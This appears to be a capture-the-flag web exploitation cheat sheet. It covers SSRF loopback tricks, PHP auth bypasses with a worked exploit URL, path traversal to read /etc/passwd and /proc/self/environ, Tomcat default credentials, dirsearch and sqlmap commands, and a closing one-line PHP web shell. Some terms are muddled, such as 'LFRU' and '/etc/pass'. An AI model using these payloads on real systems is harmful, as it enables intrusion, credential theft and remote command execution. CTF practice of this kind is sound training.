# Tips and Tricks for Web

## Robots
Sometimes you gotta check out for `/robots.txt`

## Website Loopback:
If a challange asks for Preview a URL, we can use a [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) or a [nip](https://nip.io/) or [loopback](https://qiita.com/shimoju/items/81ed5055d2fec5bb9c1e) to exploit a vulnerability in DNS to get the flag

## PHP
### PHP []
When Submit was pressed, a POST request was sent to the server containing:  `password=yourinput`
We break the application by passing an array as the password:  `password[]=`

### PHP Code Page:
If you are presented with a page that has a line of PHP code like:
```php
<?php
$hashed_key = '79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff';
$parsed = parse_url($_SERVER['REQUEST_URI']);
if(isset($parsed["query"])){
    $query = $parsed["query"];
    $parsed_query = parse_str($query);
    if($parsed_query!=NULL){
        $action = $parsed_query['action'];
    }

    if($action==="auth"){
        $key = $_GET["key"];
        $hashed_input = hash('sha256', $key);
        //echo $hashed_input.'\n';
        if($hashed_input!==$hashed_key){
            die("GTFO!");
        }

        echo file_get_contents("/flag");
    }
}else{
    show_source(__FILE__);
}
?>
```
Then you need to excute the commands in the url line such as `<host>/?action=auth&`  
So, inorder to get the flag from the above, we need to make our own `key` with `$ echo -n test | sha256sum` that will give us the new key `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` and now we execute in the url `<host>/?action=auth&key=test&hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` which will give us the flag

## Web Upload

If we have a LFRU (Local File Remote Upload) we use:
`http://website.com:port/files/../../../../etc/pass`.
If that doesnt work we then use
`http://website.com:port/files/..%2F..%2F..%2F..%2Fetc%2Fpass`
for LFI.

If `etc/pass` is useless we use then `/proc/self/environ` by `http://website.com:port/files/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron`
Add more %2F inbetween if needed.

## Tomcat Manager
Apache Tomcat has a `manager`, so inorder to access him we place this at the end of the url `/manager/html`.  
If luck still isnt on our side, we add tomcat default credentials too at the begining of the url, such as: `http://tomcat:tomcat@host:proxy/manager/html`


## dirsearch

python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar

## SQL Map
### SQL Injection
If we have a input box vulnerable to `SQL Injection`, we can execute this command through a `POST` request:  
`sqlmap.py -r post.txt -p id --dump`  
In the post file we will have the `POST` request, we can get it from `Google Developer tools` or `Burp`  
(post.txt)
```sh
POST /index.php HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://host/index.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
 
id=a&submit1=submit
```

## Image Valun
<?php system($_GET['cmd']); die(); ?>
